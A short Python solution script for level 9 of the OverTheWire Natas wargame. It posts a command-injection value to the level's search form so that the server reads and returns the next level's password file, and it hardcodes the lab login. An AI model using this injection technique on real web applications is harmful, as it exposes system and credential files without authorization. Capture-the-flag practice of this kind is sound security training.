import re
import requests
import html

user = 'natas9'
password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'
url = 'http://{}.natas.labs.overthewire.org/'.format(user)
data = {'needle' : '. /etc/natas_webpass/natas10 #', 'submit' : 'Search'}
r = requests.Session().post(url, data= data, auth=(user, password)).text

print(re.findall('pre>\n(.*)', r)[0])